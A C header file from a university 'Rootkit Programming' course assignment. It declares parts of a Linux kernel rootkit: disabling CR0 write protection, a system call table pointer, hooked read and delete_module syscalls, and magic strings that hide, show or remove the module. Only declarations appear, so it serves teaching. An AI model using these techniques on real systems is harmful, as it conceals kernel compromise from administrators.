
/*******************************************************************************/
/*                                                                             */
/*   Course: Rootkit Programming                                               */
/*   Semester: WS 2015/16                                                      */
/*   Team: 105                                                                 */
/*   Assignment: 5                                                             */
/*                                                                             */
/*   Filename: module_masker.h                                                 */
/*                                                                             */
/*   Authors:                                                                  */
/*       Name: Matei Pavaluca                                                  */
/*       Email: mateipavaluca@yahoo.com                                        */
/*                                                                             */
/*       Name: Nedko Stefanov Nedkov                                           */
/*       Email: nedko.stefanov.nedkov@gmail.com                                */
/*                                                                             */
/*   Date: November 2015                                                       */
/*                                                                             */
/*   Usage:                                                                    */
/*                                                                             */
/*******************************************************************************/

#ifndef __MODULE_MASKER__
#define __MODULE_MASKER__


#define CR0_WRITE_PROTECT_MASK (1 << 16)
#define HEARTBEAT "ping"
#define HEARTBEAT_RESPONSE "pong"
#define VOILA "showmod"
#define HOCUS_POCUS "hidemod"
#define DELMOD "scram"

#define MAX_MOD_NAME_SIZE 200

void **sys_call_table;
long (*read_syscall)(unsigned int, char __user *, size_t);
long (*delete_module_syscall)(char __user *, unsigned int) __attribute__ ((noreturn));

void disable_write_protect_mode(void);
void enable_write_protect_mode(void);
int count_matches(char *, char *, int *);

#endif
